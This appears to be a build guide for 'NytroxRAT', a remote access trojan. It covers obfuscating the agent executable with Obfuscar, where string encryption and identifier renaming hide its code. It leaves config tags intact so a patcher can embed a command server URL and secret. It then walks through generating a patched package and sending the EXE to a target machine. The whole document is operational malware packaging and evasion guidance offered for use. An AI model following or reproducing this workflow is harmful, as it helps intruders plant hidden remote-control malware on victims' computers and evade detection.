# NytroxRAT Agent — Obfuscation Guide

## Quick start (one time setup)
```
dotnet tool install -g obfuscar
```

## Option A — Automatic (recommended)
Obfuscar runs automatically after every **Release** publish:
```
dotnet publish Agent -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
```
Obfuscated output appears in:
```
Agent\bin\Release\net9.0-windows\Obfuscated\NytroxRAT.Agent.exe
```

## Option B — Manual
```
cd Agent
obfuscar.console obfuscar.xml
```

## Option C — Skip obfuscation on a Release build
```
dotnet build -c Release /p:SkipObfuscar=true
```

## After obfuscating — verify before patching
In NytroxRAT Admin Console → [ BUILD ] tab → click [ VERIFY EXE ]
Point it at the obfuscated EXE. It must show:
  ✓ NYTXURL: tag found
  ✓ NYTXSEC: tag found

If either tag is missing, AgentConfig was accidentally obfuscated.
Check that obfuscar.xml still has:
  <SkipType name="NytroxRAT.Agent.AgentConfig" />

## What gets obfuscated
| Item                        | Obfuscated? | Reason                              |
|-----------------------------|-------------|-------------------------------------|
| AgentConfig class/fields    | NO          | Binary patcher needs raw byte tags  |
| Shared.Models (Packets etc) | NO          | JSON serializer needs property names|
| AgentRunner + all services  | YES         | Safe to rename                      |
| Crypto helpers              | YES         | Safe to rename                      |
| String literals             | YES         | HideStrings=true encrypts them      |
| Method/field names          | YES         | Renamed to short random identifiers |

## Workflow summary
1. Build Agent (Release)
2. Obfuscar runs automatically → Obfuscated\NytroxRAT.Agent.exe
3. Open NytroxRAT Client → [ BUILD ] tab
4. [ VERIFY EXE ] on the obfuscated EXE → both tags must show ✓
5. Fill in Client URL + Secret → [ GENERATE AGENT PACKAGE ]
6. Send the single patched EXE to the target machine
